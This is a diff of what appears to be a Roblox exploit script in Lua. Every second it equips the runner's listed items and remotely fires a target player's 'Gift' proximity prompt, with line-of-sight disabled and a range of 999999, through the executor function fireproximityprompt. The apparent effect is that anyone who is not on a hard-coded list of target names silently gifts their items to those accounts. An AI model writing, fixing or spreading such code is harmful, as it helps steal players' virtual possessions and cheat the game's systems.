@@ -59,11 +59,11 @@ local ItemList = {
     "Gold"
 }
 
-local function getTargetCharacter()
+local function getTargetPlayer()
     for _, name in ipairs(TARGET_NAMES) do
         local p = Players:FindFirstChild(name)
-        if p and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
-            return p.Character
+        if p then
+            return p
         end
     end
     return nil
@@ -80,32 +80,36 @@ end
 
 while task.wait(1) do
     if not isLocalPlayerTarget() then
-        local character = LocalPlayer.Character
-        local backpack = LocalPlayer:FindFirstChild("Backpack")
+        local targetPlayer = getTargetPlayer()
         
-        if character and backpack then
-            for _, itemName in ipairs(ItemList) do
-                local item = backpack:FindFirstChild(itemName)
-                if item then item.Parent = character end
-            end
+        if targetPlayer then
+            local character = LocalPlayer.Character
+            local backpack = LocalPlayer:FindFirstChild("Backpack")
             
-            local targetChar = getTargetCharacter()
-            if targetChar then
-                local hrp = targetChar:FindFirstChild("HumanoidRootPart")
-                local prompt = hrp and hrp:FindFirstChild("Gift")
-                
-                local isHoldingItem = false
+            if character and backpack then
                 for _, itemName in ipairs(ItemList) do
-                    if character:FindFirstChild(itemName) then
-                        isHoldingItem = true
-                        break
-                    end
+                    local item = backpack:FindFirstChild(itemName)
+                    if item then item.Parent = character end
                 end
                 
-                if isHoldingItem and prompt and prompt:IsA("ProximityPrompt") then
-                    prompt.RequiresLineOfSight = false
-                    prompt.MaxActivationDistance = 999999
-                    fireproximityprompt(prompt)
+                local targetChar = targetPlayer.Character
+                if targetChar then
+                    local hrp = targetChar:FindFirstChild("HumanoidRootPart")
+                    local prompt = hrp and hrp:FindFirstChild("Gift")
+                    
+                    local isHoldingItem = false
+                    for _, itemName in ipairs(ItemList) do
+                        if character:FindFirstChild(itemName) then
+                            isHoldingItem = true
+                            break
+                        end
+                    end
+                    
+                    if isHoldingItem and prompt and prompt:IsA("ProximityPrompt") then
+                        prompt.RequiresLineOfSight = false
+                        prompt.MaxActivationDistance = 999999
+                        fireproximityprompt(prompt)
+                    end
                 end
             end
         end
